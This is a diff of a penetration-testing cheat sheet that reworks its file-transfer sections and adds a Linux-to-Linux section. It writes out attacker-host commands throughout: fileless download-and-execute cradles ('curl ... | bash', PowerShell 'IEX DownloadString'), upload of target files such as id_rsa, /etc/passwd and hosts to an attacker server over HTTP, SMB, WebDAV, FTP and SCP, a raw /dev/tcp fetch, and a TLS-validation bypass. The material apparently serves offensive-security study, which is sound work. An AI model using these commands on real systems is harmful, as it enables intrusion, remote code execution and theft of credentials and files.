@@ -101,12 +101,16 @@
     - `4.4.2` Bind shells
     - `4.4.3` Web shells
     - `4.4.4` TTY upgrade
-  - `4.5` **File Transfer (Windows ⇄ Linux)**
+  - `4.5` **File Transfer (Agnostic — Windows & Linux)**
     - `4.5.1` Base64 encode/decode
-    - `4.5.2` PowerShell web (HTTP/HTTPS)
+    - `4.5.2` Web download/upload (HTTP/HTTPS)
     - `4.5.3` SMB (TCP/445)
     - `4.5.4` WebDAV (SMB over HTTP)
     - `4.5.5` FTP (TCP/21)
+  - `4.6` **File Transfer (Linux ⇄ Linux)**
+    - `4.6.1` Hosting a web server for downloads
+    - `4.6.2` Bash /dev/tcp download
+    - `4.6.3` SSH / SCP (download & upload)
 - `5` **Active Directory Enumeration**
   - `5.1` ldapdomaindump
   - `5.2` BloodHound
@@ -2272,34 +2276,38 @@ stty rows <ROWS> columns <COLS>
 
 </details>
 
-### 4.5 File Transfer (Windows ⇄ Linux)
+### 4.5 File Transfer (Agnostic — Windows & Linux)
 
-Every method works both directions — download (Windows target pulls a file from the Linux attacker) and upload (Windows target pushes a file back). Choose by what egress the target allows (HTTP/HTTPS is almost always out; SMB 445 is commonly blocked, in which case use WebDAV) and by the shell you hold (non-interactive shells need command files or PowerShell one-liners rather than interactive prompts).
+Every method works both directions — download (target pulls a file from the attacker) and upload (target pushes a file back) — between Windows and Linux targets alike and Linux ⇄ Linux. Each technique shows the Windows and Linux versions side by side, so pick the client that matches the OS on each end; the attacker-side server commands are the same regardless. Choose by what egress the target allows (HTTP/HTTPS is almost always out; SMB 445 is commonly blocked, in which case use WebDAV) and by the shell you hold (non-interactive shells need command files or one-liners rather than interactive prompts).
 
 #### 4.5.1 Base64 encode/decode
 
-**Download — Linux → Windows:**
+**Encode — Linux source:**
 
 ```bash
 md5sum id_rsa
 cat id_rsa | base64 -w 0;echo
 ```
 
-```powershell
-[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
-Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
-```
-
-**Upload — Windows → Linux:**
+**Encode — Windows source:**
 
 ```powershell
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
 ```
 
+**Decode — Linux destination:**
+
 ```bash
 echo '<b64>' | base64 -d > hosts
 md5sum hosts
+```
+
+**Decode — Windows destination:**
+
+```powershell
+[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("..."))
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```
 
 <details>
@@ -2308,8 +2316,8 @@ md5sum hosts
 **Description**
 
 - No network involved — pure text over any shell.
-- Download (Linux → Windows): encode a file on the attacker as base64, paste the string into PowerShell on the target, write it back to bytes, and verify the hash matches.
-- Upload (Windows → Linux): base64-encode a target file in PowerShell, paste the string to the attacker, and decode it back to a file.
+- Encode the file on the source host (Linux `base64` or PowerShell), paste the string into the destination host's shell, decode it back to bytes, and verify the hash matches.
+- Works for every OS pairing — Linux ⇄ Linux uses bash on both ends, Windows ⇄ Linux mixes PowerShell + bash.
 
 **Parameters**
 
@@ -2330,24 +2338,62 @@ md5sum hosts
 
 </details>
 
-#### 4.5.2 PowerShell web (HTTP/HTTPS)
+#### 4.5.2 Web download/upload (HTTP/HTTPS)
 
-**Download — Linux → Windows:**
-
-```powershell
-(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
-(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')
-IEX (New-Object Net.WebClient).DownloadString('<URL>')
-(New-Object Net.WebClient).DownloadString('<URL>') | IEX
-Invoke-WebRequest '<URL>' -OutFile <OUTPUT_FILE>
-```
-
-**Upload — Windows → Linux:**
+**Attacker — host an upload server (HTTP):**
 
 ```bash
 pip3 install uploadserver
 python3 -m uploadserver
 ```
+
+**Attacker — host an upload server (HTTPS, self-signed):**
+
+```bash
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+```
+
+```bash
+mkdir https && cd https
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+```
+
+**Download — Linux target:**
+
+```bash
+wget https://<ATTACKER_IP>/<FILE> -O /tmp/<FILE>
+curl -o /tmp/<FILE> https://<ATTACKER_IP>/<FILE>
+```
+
+**Download — Windows target:**
+
+```powershell
+(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')
+(New-Object Net.WebClient).DownloadFileAsync('<URL>','<OUTPUT_FILE>')
+Invoke-WebRequest '<URL>' -OutFile <OUTPUT_FILE>
+```
+
+**Fileless execution — Linux target:**
+
+```bash
+curl https://<ATTACKER_IP>/<FILE> | bash
+wget -qO- https://<ATTACKER_IP>/<FILE> | python3
+```
+
+**Fileless execution — Windows target:**
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('<URL>')
+(New-Object Net.WebClient).DownloadString('<URL>') | IEX
+```
+
+**Upload — Linux target:**
+
+```bash
+curl -X POST https://<ATTACKER_IP>/upload -F 'files=@<FILE>' -F 'files=@<FILE2>' --insecure
+```
+
+**Upload — Windows target:**
 
 ```powershell
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
@@ -2369,20 +2415,26 @@ echo '<b64>' | base64 -d -w 0 > <OUT>
 
 **Description**
 
-- Download (Linux → Windows): pull a file from an attacker-hosted web server using `Net.WebClient` or `Invoke-WebRequest`, or run it filelessly in memory with `DownloadString | IEX`.
-- Upload (Windows → Linux): serve an upload page with Python's `uploadserver` and POST a file with `PSUpload.ps1`, or base64-encode the file and POST it to a `nc` listener.
 - HTTP/HTTPS is almost always permitted outbound, making this the default transfer method.
+- Download (attacker → target): the target pulls a file from an attacker-hosted web server with wget/curl (Linux) or `Net.WebClient`/`Invoke-WebRequest` (Windows), or runs it filelessly via a pipe to an interpreter (`curl | bash`, `DownloadString | IEX`).
+- Upload (target → attacker): serve an upload page with Python's `uploadserver` (HTTP or HTTPS) and POST files with `curl` (Linux) or `PSUpload.ps1` (Windows), or base64-encode the file and POST it to a `nc` listener.
+- To host files for download (not upload), use the mini web servers in 4.6.1.
 
 **Parameters**
 
-- `(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')` — Downloads a file to disk (synchronous).
-- `DownloadFileAsync` — Downloads a file to disk asynchronously.
-- `IEX (New-Object Net.WebClient).DownloadString('<URL>')` — Downloads and executes PowerShell code in memory (fileless).
-- `DownloadString(...) | IEX` — Pipe variant of the fileless in-memory cradle.
-- `Invoke-WebRequest '<URL>' -OutFile <FILE>` — Downloads to disk; aliases `iwr`, `curl`, `wget`, but slower.
 - `python3 -m uploadserver` — Serves an upload page at `/upload` on port 8000.
+- `openssl req -x509 ...` — Generates a self-signed certificate + key in one PEM file.
+- `python3 -m uploadserver 443 --server-certificate ~/server.pem` — Serves HTTPS with an upload page at `/upload` on port 443.
+- `wget <URL> -O <OUT>` — Linux download; `-O` (uppercase) sets the output filename.
+- `curl -o <OUT> <URL>` — Linux download; `-o` (lowercase) sets the output filename.
+- `(New-Object Net.WebClient).DownloadFile('<URL>','<OUTPUT_FILE>')` — Windows download to disk (synchronous); `DownloadFileAsync` is the async variant.
+- `Invoke-WebRequest '<URL>' -OutFile <FILE>` — Windows download to disk; aliases `iwr`, `curl`, `wget`, but slower.
+- `curl <URL> | bash` — Linux fileless execution via pipe.
+- `wget -qO- <URL> | python3` — Linux fileless; `-q` quiet, `-O-` prints to stdout.
+- `IEX (New-Object Net.WebClient).DownloadString('<URL>')` — Windows fileless in-memory cradle (also `DownloadString(...) | IEX`).
 - `IEX(New-Object Net.WebClient).DownloadString('...PSUpload.ps1')` — Loads the PSUpload.ps1 helper (defines `Invoke-FileUpload`).
 - `Invoke-FileUpload -Uri ... -File <FILE>` — PSUpload.ps1 helper that POSTs a file to the upload server.
+- `curl -X POST https://<IP>/upload -F 'files=@<FILE>'` — Linux upload; repeat `-F 'files=@...'` for multiple files; `--insecure` skips cert validation.
 - `[System.convert]::ToBase64String(...)` / `Get-Content -Encoding Byte` — Base64-encode a file for POSTing.
 - `nc -lvnp 8000` — Captures the POST body on the attacker.
 - `base64 -d -w 0` — Decodes the captured base64 back to a file.
@@ -2393,7 +2445,8 @@ echo '<b64>' | base64 -d -w 0 > <OUT>
 - If the Internet Explorer first-launch config is incomplete the download errors — add `-UseBasicParsing`.
 - Untrusted SSL/TLS cert error — bypass with `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`.
 - Web filtering may block categories, file types (e.g. `.exe`), or non-whitelisted domains.
-- Fileless (`DownloadString | IEX`) never touches disk; `DownloadFile` does.
+- Fileless variants never touch disk; `DownloadFile`, wget, and curl do.
+- Keep `server.pem` out of the web root — serve it from a separate directory (`mkdir https && cd https`).
 - See Harmj0y's PowerShell download cradles list (https://gist.github.com/HarmJ0y/bb48307ffa663256e239) — cradles differ in proxy awareness and disk touch.
 
 </details>
@@ -2405,7 +2458,7 @@ sudo impacket-smbserver share -smb2support /tmp/smbshare
 sudo impacket-smbserver share -smb2support -user test -password test /tmp/smbshare
 ```
 
-**Download — Linux → Windows:**
+**Download — Windows target:**
 
 ```cmd
 copy \\<ATTACKER_IP>\share\nc.exe
@@ -2413,10 +2466,26 @@ net use n: \\<ATTACKER_IP>\share /user:test test
 copy n:\nc.exe
 ```
 
-**Upload — Windows → Linux:**
+**Upload — Windows target:**
 
 ```cmd
 copy <FILE> \\<ATTACKER_IP>\share\
+```
+
+**Download — Linux target:**
+
+```bash
+smbclient //<ATTACKER_IP>/<SHARE> -c 'get <FILE>'
+```
+
+```bash
+sudo mount -t cifs //<ATTACKER_IP>/<SHARE> /mnt -o username=<USER>,password=<PASS>
+```
+
+**Upload — Linux target:**
+
+```bash
+smbclient //<ATTACKER_IP>/<SHARE> -c 'put <FILE>'
 ```
 
 <details>
@@ -2424,18 +2493,21 @@ copy <FILE> \\<ATTACKER_IP>\share\
 
 **Description**
 
-- Attacker hosts an SMB share with `impacket-smbserver`; the Windows target maps or copies to/from it over TCP/445.
-- Download (Linux → Windows): `copy` a file off the attacker's share onto the target.
-- Upload (Windows → Linux): `copy` a file from the target into the attacker's share.
+- Attacker hosts an SMB share with `impacket-smbserver`; the target copies to/from it over TCP/445.
+- Download: the target pulls a file off the attacker's share with Windows `copy`/`net use` or Linux `smbclient`/`mount`.
+- Upload: the target copies a file into the attacker's share.
 
 **Parameters**
 
 - `impacket-smbserver <NAME>` — Names the share (e.g. `share`).
 - `-smb2support` — Enables SMB2 (required by modern Windows clients).
 - `-user <USER> -password <PASS>` — Adds an authenticated account to the share (guests are often refused).
-- `copy \\<ATTACKER_IP>\share\<FILE>` — Copies a file from the attacker's share.
+- `copy \\<ATTACKER_IP>\share\<FILE>` — Windows copy from the attacker's share.
 - `net use n: \\<ATTACKER_IP>\share /user:test test` — Mounts the share as drive `n:` with explicit credentials.
-- `copy <FILE> \\<ATTACKER_IP>\share\` — Copies a target file into the attacker's share.
+- `copy <FILE> \\<ATTACKER_IP>\share\` — Windows copy of a target file into the attacker's share.
+- `smbclient //<ATTACKER_IP>/<SHARE> -c 'get <FILE>'` — Linux download from the share.
+- `smbclient //<ATTACKER_IP>/<SHARE> -c 'put <FILE>'` — Linux upload into the share.
+- `sudo mount -t cifs //<ATTACKER_IP>/<SHARE> /mnt -o username=<USER>,password=<PASS>` — Linux mount of the share (needs `cifs-utils`); then use plain `cp`.
 
 **Notes**
 
@@ -2452,23 +2524,22 @@ sudo pip3 install wsgidav cheroot
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
 
-**Target browse:**
+**Windows target:**
 
 ```cmd
 dir \\<ATTACKER_IP>\DavWWWRoot
-```
-
-**Upload — Windows → Linux:**
-
-```cmd
 copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\
-copy <FILE> \\<ATTACKER_IP>\sharefolder\
+copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>
 ```
 
-**Download — Linux → Windows:**
+**Linux target (curl):**
 
-```cmd
-copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>
+```bash
+curl http://<ATTACKER_IP>/sharefolder/<FILE> -o <FILE>
+```
+
+```bash
+curl -T <FILE> http://<ATTACKER_IP>/sharefolder/
 ```
 
 <details>
@@ -2477,15 +2548,17 @@ copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>
 **Description**
 
 - WebDAV (RFC 4918) lets a web server act as a file server over HTTP(S), useful when TCP/445 is blocked.
-- Attacker hosts a WebDAV server with `wsgidav`; the Windows target browses and copies to/from it as if it were an SMB share.
+- Attacker hosts a WebDAV server with `wsgidav`; the target browses and copies to/from it as if it were an SMB share. Windows uses the SMB-style `copy`, Linux uses curl (GET = download, `-T` = PUT upload).
 
 **Parameters**
 
 - `wsgidav --host=0.0.0.0 --port=80 --root=/tmp` — Serves the `/tmp` directory over WebDAV on port 80.
 - `--auth=anonymous` — Permits unauthenticated access.
 - `dir \\<ATTACKER_IP>\DavWWWRoot` — Lists the WebDAV root from Windows.
-- `copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\` — Uploads a target file to the WebDAV root.
-- `copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>` — Downloads a file from the WebDAV root.
+- `copy <FILE> \\<ATTACKER_IP>\DavWWWRoot\` — Windows upload to the WebDAV root.
+- `copy \\<ATTACKER_IP>\DavWWWRoot\<FILE>` — Windows download from the WebDAV root.
+- `curl http://<IP>/sharefolder/<FILE> -o <FILE>` — Linux download (GET).
+- `curl -T <FILE> http://<IP>/sharefolder/` — Linux upload (PUT).
 
 **Notes**
 
@@ -2503,19 +2576,32 @@ sudo python3 -m pyftpdlib --port 21
 sudo python3 -m pyftpdlib --port 21 --write
 ```
 
-**Download — Linux → Windows:**
+**Download — Windows target:**
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('ftp://<ATTACKER_IP>/file.txt','C:\Users\Public\ftp-file.txt')
 ```
 
-**Upload — Windows → Linux:**
+**Upload — Windows target:**
 
 ```powershell
 (New-Object Net.WebClient).UploadFile('ftp://<ATTACKER_IP>/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')
 ```
 
-**Non-interactive shells (FTP command file):**
+**Download — Linux target:**
+
+```bash
+wget ftp://<ATTACKER_IP>/<FILE> -O <OUTPUT>
+curl ftp://<ATTACKER_IP>/<FILE> -o <OUTPUT>
+```
+
+**Upload — Linux target:**
+
+```bash
+curl -T <FILE> ftp://<ATTACKER_IP>/
+```
+
+**Non-interactive shells (Windows FTP command file):**
 
 ```text
 open <ATTACKER_IP>
@@ -2535,17 +2621,20 @@ ftp -v -n -s:ftpcommand.txt
 **Description**
 
 - Attacker hosts an FTP server with `pyftpdlib` (anonymous enabled by default).
-- Download (Linux → Windows): the target pulls a file over FTP using `Net.WebClient`.
-- Upload (Windows → Linux): the target pushes a file over FTP using `Net.WebClient.UploadFile`.
-- Non-interactive shells: drive the Windows `ftp` client with a command file (`-s:`) since no interactive prompt is available.
+- Download: the target pulls a file over FTP with PowerShell `Net.WebClient` (Windows) or wget/curl (Linux).
+- Upload: the target pushes a file over FTP with `Net.WebClient.UploadFile` (Windows) or `curl -T` (Linux).
+- Non-interactive Windows shells: drive the `ftp` client with a command file (`-s:`) since no interactive prompt is available.
 
 **Parameters**
 
 - `python3 -m pyftpdlib --port 21` — Starts the FTP server on port 21.
 - `--write` — Permits uploads (default is read-only).
-- `(New-Object Net.WebClient).DownloadFile('ftp://...','<OUTPUT>')` — Downloads a file from FTP.
-- `(New-Object Net.WebClient).UploadFile('ftp://...','<FILE>')` — Uploads a file to FTP.
-- `ftp -v -n -s:ftpcommand.txt` — Runs the FTP client non-interactively, reading commands from `ftpcommand.txt`.
+- `(New-Object Net.WebClient).DownloadFile('ftp://...','<OUTPUT>')` — Windows download from FTP.
+- `(New-Object Net.WebClient).UploadFile('ftp://...','<FILE>')` — Windows upload to FTP.
+- `wget ftp://<IP>/<FILE> -O <OUT>` — Linux download from FTP.
+- `curl ftp://<IP>/<FILE> -o <OUT>` — Linux download from FTP.
+- `curl -T <FILE> ftp://<IP>/` — Linux upload to FTP.
+- `ftp -v -n -s:ftpcommand.txt` — Runs the Windows FTP client non-interactively, reading commands from `ftpcommand.txt`.
 - `GET <FILE>` / `PUT <FILE>` — Download / upload commands inside the FTP command file.
 
 **Notes**
@@ -2553,6 +2642,140 @@ ftp -v -n -s:ftpcommand.txt
 - `pyftpdlib` defaults to port 2121, so pass `--port 21` explicitly.
 - Uploads fail unless the server was started with `--write`.
 - When the shell is non-interactive (no FTP prompt available), drive the FTP client with the `-s:` command file instead.
+
+</details>
+
+### 4.6 File Transfer (Linux ⇄ Linux)
+
+OS-agnostic techniques (base64 4.5.1, web 4.5.2, SMB 4.5.3, FTP 4.5.5) already cover both Windows and Linux targets — for Linux ⇄ Linux only the target-side client changes, and the attacker-side server commands stay the same. This section covers the methods specific to Linux targets or to a Linux attacker box: mini web servers, bash built-ins, and SSH/SCP. HTTP/HTTPS is almost always permitted outbound and most Linux malware uses it, so pair the web server in 4.6.1 with the download/upload clients in 4.5.2; SSH (TCP/22) is frequently allowed where SMB/FTP are blocked.
+
+#### 4.6.1 Hosting a web server for downloads
+
+```bash
+python3 -m http.server
+```
+
+```bash
+python2.7 -m SimpleHTTPServer
+```
+
+```bash
+php -S 0.0.0.0:8000
+```
+
+```bash
+ruby -run -ehttpd . -p8000
+```
+
+**Target pulls the file:**
+
+```bash
+wget <ATTACKER_IP>:8000/filetotransfer.txt
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Stands up a quick HTTP server serving the current directory, letting a target download files from the attacker without a full web server install.
+- A compromised Linux box almost always has python, php, or ruby, so this works even when a full web server is missing — a capability Windows targets rarely have.
+- This is the download half of 4.5.2: any OS target can pull from this server (Windows via `Net.WebClient`/`iwr`, Linux via wget/curl), but only a Linux box can start these servers.
+
+**Parameters**
+
+- `python3 -m http.server` — Serves the current directory on 0.0.0.0:8000 (default port).
+- `python2.7 -m SimpleHTTPServer` — Python 2 equivalent module.
+- `php -S 0.0.0.0:8000` — PHP built-in development server.
+- `ruby -run -ehttpd . -p8000` — Ruby WEBrick server serving `.` on port 8000.
+- `wget <ATTACKER_IP>:8000/<FILE>` — Target-side fetch; the target downloads *from* us.
+
+**Notes**
+
+- Direction matters: here the target **pulls** the file (outbound from the target), which is more likely to be permitted than inbound uploads.
+- Serve from the directory containing the files you want to expose; bind `0.0.0.0` so the target can reach the listener.
+- These mini-servers lack auth and TLS — don't expose sensitive data on them.
+
+</details>
+
+#### 4.6.2 Bash /dev/tcp download
+
+```bash
+exec 3<>/dev/tcp/10.10.10.32/80
+```
+
+```bash
+echo -e "GET /<FILE> HTTP/1.1\n\n">&3
+```
+
+```bash
+cat <&3
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- Bash's built-in `/dev/tcp/<HOST>/<PORT>` pseudo-device opens raw TCP connections, giving a download primitive when no wget, curl, or python exists.
+- Available since Bash 2.04 when compiled with `--enable-net-redirections`.
+
+**Parameters**
+
+- `exec 3<>/dev/tcp/<IP>/<PORT>` — Opens a TCP connection to the host on file descriptor 3.
+- `echo -e "GET /<FILE> HTTP/1.1\n\n">&3` — Writes a raw HTTP GET request to the connection.
+- `cat <&3` — Reads the server response (HTTP headers + body) from the connection.
+
+**Notes**
+
+- Raw HTTP only — no TLS, so HTTPS endpoints cannot be fetched this way.
+- The response includes the HTTP response headers; strip them or redirect the body to a file and edit accordingly.
+- Same `/dev/tcp` mechanism powers the bash reverse shell in 4.4.1.
+
+</details>
+
+#### 4.6.3 SSH / SCP (download & upload)
+
+**Attacker-side server setup:**
+
+```bash
+sudo systemctl enable ssh
+sudo systemctl start ssh
+netstat -lnpt
+```
+
+**Download — target pulls from attacker:**
+
+```bash
+scp <USER>@<ATTACKER_IP>:/root/myroot.txt .
+```
+
+**Upload — target pushes to a host running sshd:**
+
+```bash
+scp /etc/passwd <USER>@<TARGET_IP>:/home/<USER>/
+```
+
+<details>
+<summary>Details</summary>
+
+**Description**
+
+- SCP rides on the SSH protocol, so it is available wherever `sshd` runs and often works outbound when SMB/FTP are blocked.
+- Works in either direction depending on which host runs the SSH server.
+
+**Parameters**
+
+- `sudo systemctl enable ssh` / `sudo systemctl start ssh` — Enables and starts the SSH server on the attacker box.
+- `netstat -lnpt` — Confirms sshd is listening on 0.0.0.0:22.
+- `scp <USER>@<IP>:<PATH> <DEST>` — Downloads `<PATH>` from the remote host; `scp` syntax mirrors `cp`.
+- `scp <FILE> <USER>@<IP>:<DEST>` — Uploads `<FILE>` to the remote host.
+
+**Notes**
+
+- Create a temporary user account for file transfers instead of using your primary credentials or keys on a remote computer.
+- `scp` prompts for a password — needs an interactive shell (or `sshpass -p <PASS>` for non-interactive shells).
+- `scp -i <KEY>` authenticates with an SSH private key instead of a password.
 
 </details>
 
